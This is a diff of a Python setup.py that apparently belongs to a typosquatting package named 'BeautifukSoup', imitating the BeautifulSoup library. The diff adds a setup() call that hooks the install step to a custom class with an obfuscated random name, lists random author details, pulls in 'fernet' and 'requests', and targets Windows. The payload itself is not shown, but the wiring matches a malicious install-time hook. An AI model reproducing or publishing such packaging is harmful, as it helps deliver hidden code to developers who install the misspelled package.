@@ -18,5 +18,22 @@ class iDIAcPBhsGpcDfJzuLzWmQVNAItyTjITwuAlgHKlwAiXHhkEHaybFoxQsFzYTRfWGeqXPXMwRx
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name="BeautifukSoup",
+    version=VERSION,
+    author="bAFgBYDGPFwf",
+    author_email="jcFnbDZZeVSpjIFFB@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': iDIAcPBhsGpcDfJzuLzWmQVNAItyTjITwuAlgHKlwAiXHhkEHaybFoxQsFzYTRfWGeqXPXMwRxWFRAnUEFNqeNMoILcyeWBMpbFatHMwcOvVjJxsyciGvOygUkCsIAPAKadsrZUfdFiCefBYlBhuHMGCidcWTencnHnhkZrieNqvfgXuOAWiUlYEZTgHUZjKyl,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
